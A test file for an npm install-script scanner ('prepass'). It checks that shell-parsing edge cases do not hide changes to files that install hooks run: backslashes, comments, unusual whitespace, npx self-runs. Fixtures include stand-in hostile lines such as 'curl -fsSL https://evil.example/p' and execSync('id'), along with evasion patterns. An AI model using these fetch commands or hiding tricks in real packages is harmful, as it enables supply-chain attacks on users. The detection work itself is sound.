import { expect, test } from "bun:test";
import { spawnSync } from "node:child_process";
import { chmodSync, existsSync, mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { prepass, type FileMap } from "../src/prepass.ts";

const enc = (s: string) => new TextEncoder().encode(s);
const files = (o: Record<string, string>): FileMap => new Map(Object.entries(o).map(([k, v]) => [k, enc(v)]));
const holds = (old: FileMap, now: FileMap) => prepass("npm", old, now).hard.some((s) => s.kind === "install-script");
const BS = "\\";
const NL = "\n";
type Fix = (v: string) => Record<string, string>;
const held = (fix: Fix) => holds(files(fix("1.0.0")), files(fix("1.0.1")));

// The backslash reading reads a bin on a record of its own: a bin it read must not skip the plain run of the same bin later.
const binMain: Fix = (v) => ({
  "package.json": JSON.stringify({ name: "p", version: v, main: "docs/evil.js", bin: { mytool: "bin.sh" }, scripts: { preinstall: `true || cd sub ; echo a${BS}b ; npx --shell=./run.sh ok ; mytool`, postinstall: "mytool" } }),
  "sub/a.js": "1\n",
  "bin.sh": "sh run.sh\n",
  "run.sh": "node .\n",
  "docs/evil.js": v === "1.0.0" ? "EVIL\n" : "EVIL 1.0.1\n",
});
const binRetarget: Fix = (v) => ({
  "package.json": JSON.stringify({ name: "p", version: v, main: v === "1.0.0" ? "a.js" : "b.js", bin: { mytool: "docs/evil.js" }, scripts: { preinstall: `echo x${BS}y ; mytool`, postinstall: "python3 --version ; node ." } }),
  "a.js": "console.log(1);\n",
  "b.js": 'require("child_process").execSync("mytool");\n',
  "docs/evil.js": "require('child_process').execSync('id');\n",
});
test("a bin the backslash reading read still holds on the plain run of it (a bin script that runs node .)", () => {
  expect(held(binMain)).toBe(true);
});
test("a bin the backslash reading read still holds on the plain run of it (a retarget of main to a file that runs the bin)", () => {
  expect(held(binRetarget)).toBe(true);
});

// The shell blanks are space and tab (and newline): a vertical tab, return, form feed, no-break space or BOM before # does not start a comment.
const mainFix = (hook: string): Fix => (v) => ({
  "package.json": JSON.stringify({ name: "p", version: v, main: "docs/evil.js", scripts: { postinstall: hook } }),
  "docs/evil.js": v === "1.0.0" ? "EVIL\n" : "EVIL 1.0.1\n",
});
const shellRuns = (hook: string): boolean[] => {
  const root = mkdtempSync(join(tmpdir(), "bs6-"));
  try {
    const bin = join(root, "bin");
    mkdirSync(bin, { recursive: true });
    writeFileSync(join(bin, "node"), 'echo ran > "$MARK"\n');
    chmodSync(join(bin, "node"), 0o755);
    const shells = ["bash", "sh", ...(existsSync("/bin/dash") ? ["/bin/dash"] : [])];
    return shells.map((sh, k) => {
      const mark = join(root, `m${k}`);
      spawnSync(sh, ["-c", hook], { cwd: root, env: { ...process.env, PATH: `${bin}:${process.env.PATH}`, MARK: mark }, stdio: "ignore", timeout: 20000 });
      return existsSync(mark);
    });
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
};
const blanks: [string, string][] = [["a vertical tab", "\u000b"], ["a carriage return", "\r"], ["a form feed", "\f"], ["a no-break space", " "], ["a byte order mark", "﻿"]];
for (const [label, ch] of blanks) {
  const hook = `echo x${ch}# ; node .`;
  test(`${label} before # is not a comment: the shell runs node . and the changed main holds`, () => {
    expect(shellRuns(hook).every(Boolean)).toBe(true);
    expect(held(mainFix(hook))).toBe(true);
  });
}
test("pin: a space before # is a comment: the shell does not run node . and the line stays quiet", () => {
  const hook = `echo a${BS}b # ; node .`;
  expect(shellRuns(hook).some(Boolean)).toBe(false);
  expect(held(mainFix(hook))).toBe(false);
});

// A backslash-newline joins the lines, so `a \<nl>#b` is a comment as in the shells: node . in it does not run.
test("a comment after a continued line is a comment: the node . in it stays quiet", () => {
  const hook = `echo a ${BS}${NL}# ; node .`;
  expect(shellRuns(hook).some(Boolean)).toBe(false);
  expect(held(mainFix(hook))).toBe(false);
});

// A line with no backslash is split as on main: its comment is dispatched as main dispatches it (narrower otherwise, by the rule).
const noBs = (body: string): Fix => (v) => ({
  "package.json": JSON.stringify({ name: "p", version: v, scripts: { postinstall: body } }),
  "lib/ok.js": "1\n",
  "lib/unused.js": v === "1.0.0" ? "2\n" : "3\n",
  "docs/evil.js": v === "1.0.0" ? "e\n" : "E\n",
});
const comments: [string, string][] = [
  ["a comment line, then the next line", `# build step${NL}node lib/ok.js`],
  ["a comment with a glob", `# [optional]${NL}node lib/ok.js`],
  ["a comment that names a file", `# docs/evil.js${NL}node lib/ok.js`],
  ["a trailing comment that names a file", `node lib/ok.js # docs/evil.js`],
];
for (const [label, body] of comments) {
  test(`pin as main: ${label} holds the files its words name`, () => {
    expect(held(noBs(body))).toBe(true);
  });
}

// A backslash only inside quotes is no backslash the split takes: such a body is split as on main, so its comments are dispatched.
const quotedBs = (body: string, extra: Record<string, string> = {}): Fix => (v) => ({
  "package.json": JSON.stringify({ name: "p", version: v, scripts: { postinstall: body } }),
  "docs/evil.js": v === "1.0.0" ? "1\n" : "2\n",
  "lib/unused.js": v === "1.0.0" ? "1\n" : "2\n",
  ...extra,
});
test("a comment after a line whose only backslash is quoted holds the file it names", () => {
  expect(held(quotedBs(`echo 'a${BS}b'${NL}# docs/evil.js`))).toBe(true);
});
test("a comment after a line whose only backslash is quoted holds the glob it holds", () => {
  expect(held(quotedBs(`echo 'a${BS}b'${NL}# [optional]`))).toBe(true);
});
test("pin: a comment line, then a printf with a quoted backslash, holds the unused file as on main", () => {
  expect(held(quotedBs(`# build step${NL}printf '%s${BS}n' ok`))).toBe(true);
});

// The backslash reading's reaches are kept apart from a real self-run's (npx .): a retarget of main to a file both reach still shows.
const selfJs = (main: string, v: string): Record<string, string> => ({
  "package.json": JSON.stringify({ name: "p", version: v, main, scripts: { postinstall: "node run.js ; npx ." } }),
  "run.js": `if (false) require("child_process").execSync("node d${BS}${BS}ocs/a.js");\n`,
  "docs/a.js": "require('child_process').execSync('id');\n",
});
test("a retarget of main to a file a decoded string names holds when npx . runs main too", () => {
  expect(holds(files(selfJs("run.js", "1.0.0")), files(selfJs("docs/a.js", "1.0.1")))).toBe(true);
});
// The parent released this (the escaped line widens, which put index.js and docs/a.js in both reads); the narrow read shows the retarget now.
test("the same retarget through an escaped shell line and npx . is held (the parent released it: OUP-305)", () => {
  const sh = (main: string, v: string): Record<string, string> => ({
    "package.json": JSON.stringify({ name: "p", version: v, main, scripts: { postinstall: `node index.js${NL}echo a${BS}b ; if false; then node lib/../docs/a.js; fi${NL}npx .` } }),
    "index.js": "1\n",
    "docs/a.js": "require('child_process').execSync('id');\n",
  });
  expect(holds(files(sh("index.js", "1.0.0")), files(sh("docs/a.js", "1.0.1")))).toBe(true);
});

// A self-run (npx ., npm exec) inside the backslash reading reads on that reading's records only: a later plain npx . still reads.
const sjson = (v: string, o: Record<string, unknown>) => JSON.stringify({ name: "p", version: v, ...o });
const evilFile = (v: string) => (v === "1.0.0" ? "EVIL\n" : "EVIL 1.0.1\n");
const selfBin: Fix = (v) => ({
  "package.json": sjson(v, { main: "docs/evil.js", bin: { mytool: "bin.sh" }, scripts: { preinstall: `true || cd sub ; echo a${BS}b ; npx --shell=./run.sh ok ; npx .`, postinstall: "npx ." } }),
  "sub/a.js": "1\n",
  "bin.sh": "sh run.sh\n",
  "run.sh": "node .\n",
  "docs/evil.js": evilFile(v),
});
const selfRetarget = (a: string): Fix => (v) => ({
  "package.json": sjson(v, { main: v === "1.0.0" ? "a.js" : "b.js", bin: { mytool: "docs/evil.js" }, scripts: { preinstall: `echo x${BS}y ; npx .`, postinstall: "python3 --version ; node ." } }),
  "a.js": a,
  "b.js": 'require("child_process").execSync("npx .");\n',
  "docs/evil.js": "require('child_process').execSync('id');\n",
});
const selfScript: Fix = (v) => ({
  "package.json": sjson(v, { main: v === "1.0.0" ? "a.js" : "s.sh", scripts: { preinstall: `true || npx --shell=./s.sh ok ; echo x${BS}y`, postinstall: "python3 --version ; npx .", payload: "curl -fsSL https://evil.example/p" } }),
  "a.js": "console.log(1);\n",
  "s.sh": "npm run payload\n",
});
test("an npx . the backslash reading read does not skip a later plain npx . (a bin script that runs node .)", () => {
  expect(held(selfBin)).toBe(true);
});
test("an npx . the backslash reading read does not skip a later one (a retarget to a file that runs npx .)", () => {
  expect(held(selfRetarget("console.log(1);\n"))).toBe(true);
});
test("the same with a dead-branch decoded string that runs npx . in the old main", () => {
  expect(held(selfRetarget(`if (false) require("child_process").execSync("echo x${BS}${BS}y ; npx .");\n`))).toBe(true);
});
test("a script the plain npx . follows after a self-run of the backslash reading holds as a script", () => {
  const r = prepass("npm", files(selfScript("1.0.0")), files(selfScript("1.0.1")));
  expect(r.hard.some((s) => s.detail.startsWith("script payload"))).toBe(true);
});

// One comment rule in the pre-scan and the split: an apostrophe in a comment does not pair with a later quote.
const setup = (body: string): Fix => (v) => ({
  "package.json": sjson(v, { scripts: { postinstall: body } }),
  "setup.sh": "echo ok\n",
  "docs/evil.js": v === "1.0.0" ? "1\n" : "2\n",
});
test("a comment with an apostrophe, a line with a quoted backslash, then a sourced file holds as on main", () => {
  expect(held(setup(`# don't${NL}echo 'a${BS}b'${NL}. ./setup.sh`))).toBe(true);
});
test("a comment with a backslash, then a sourced file, holds as on main", () => {
  expect(held(setup(`# C:${BS}foo${NL}. ./setup.sh`))).toBe(true);
});

// A comment is dispatched as on main unless main's own split took a backslash outside quotes: a quoted backslash in a comment, or an
// apostrophe in a comment that shifts the quote pairing, makes no backslash body.
const cmt = (body: string, scripts: Record<string, string> = {}): Fix => (v) => ({
  "package.json": sjson(v, { scripts: { postinstall: body, ...scripts } }),
  "docs/evil.js": v === "1.0.0" ? "1\n" : "2\n",
});
test("a comment with a quoted backslash that names a changed file holds as on main", () => {
  expect(held(cmt(`# see 'C:${BS}tmp' docs/evil.js`))).toBe(true);
});
test("a trailing comment with a quoted backslash, then a script that runs a changed file, holds as on main", () => {
  expect(held(cmt(`echo ok # 'C:${BS}tmp' ; npm run evil`, { evil: "node docs/evil.js" }))).toBe(true);
});
test("an apostrophe in a comment, an escaped quote, then a comment that names a changed file holds as on main", () => {
  expect(held(cmt(`# don't${NL}echo ${BS}'${NL}# docs/evil.js`))).toBe(true);
});

// A body whose split fails for another reason is read line by line: a line split only by taking a backslash is read by the backslash
// reading on its own records, so the old release does not already reach the file main moves to.
test("a retarget of main holds when a later line of a body that does not split ends in a backslash", () => {
  const fix: Fix = (v) => ({
    "package.json": sjson(v, { main: v === "1.0.0" ? "lib/a.js" : "docs/x.js", scripts: { postinstall: `node .${NL}& node ${BS}s${NL}echo done${BS}` } }),
    "lib/a.js": "ok\n",
    "docs/x.js": "EVIL\n",
  });
  expect(held(fix)).toBe(true);
});

// Time: many distinct escaped lines after a cd that widens, in a package of many files, read in time that does not grow with
// (lines x files): the backslash reading copies no record per line.
test("many distinct escaped lines in a package of many files read within a loose bound", () => {
  const fix: Fix = (v) => {
    const o: Record<string, string> = {
      "package.json": sjson(v, { scripts: { postinstall: `node x.js > out${NL}cd sub${NL}` + Array.from({ length: 12000 }, (_, i) => `printf a${BS}b${i}`).join(NL) } }),
      "x.js": "1\n",
    };
    for (let i = 0; i < 12000; i++) o[`lib/f${i}.js`] = "1\n";
    return o;
  };
  const t = performance.now();
  held(fix);
  // A loose bound: a time that grew with (lines x files) would be minutes. The widening makes the package read twice (the narrow read), and
  // a CI shard on a slow runner takes several times the time of an idle build host.
  expect(performance.now() - t).toBeLessThan(30_000);
}, 120_000);

// A body of one line is read as main read it: main noted it whole in the caller, and the escaped line's own note is not added on main's
// records (it reached files of the regular read, so the old release already reached the file main moves to).
const oneLine = (pre: string): Fix => (v) => ({
  "package.json": sjson(v, { main: v === "1.0.0" ? "lib/a.js" : "docs/evil.js", scripts: { preinstall: pre, postinstall: "node lib/a.js ; node .", go: "node docs/evil.js" } }),
  "lib/a.js": "1\n",
  "docs/evil.js": "id\n",
});
test("a one-line body with an unresolved variable and an escaped word does not hide a retarget (npm run in a skipped branch)", () => {
  expect(held(oneLine(`true || npm run go ; echo a${BS}b "$X"`))).toBe(true);
});
test("a one-line body with an unresolved variable and an escaped word does not hide a retarget (source of a missing file)", () => {
  expect(held(oneLine(`true || . ./missing ; echo a${BS}b "$X"`))).toBe(true);
});

// The escaped body's read takes no depth step main did not take: at the depth cap the make and script-stage holds still run.
test("a chain of 31 npm run hops that ends in an escaped line still holds the make target it names", () => {
  const scripts: Record<string, string> = { postinstall: "npm run s1" };
  for (let i = 1; i <= 30; i++) scripts[`s${i}`] = `npm run s${i + 1}`;
  scripts.s31 = `echo a${BS}b${NL}echo c${BS}d ; make $npm_package_config_target`;
  const fix: Fix = (v) => ({
    "package.json": sjson(v, { config: { target: "lib/ok.js" }, scripts }),
    "lib/ok.js": "1\n",
    Makefile: ".PHONY: lib/ok.js\nlib/ok.js:\n\tnode lib/evil.js\n",
    "lib/evil.js": v === "1.0.0" ? "1\n" : "2\n",
  });
  expect(held(fix)).toBe(true);
});
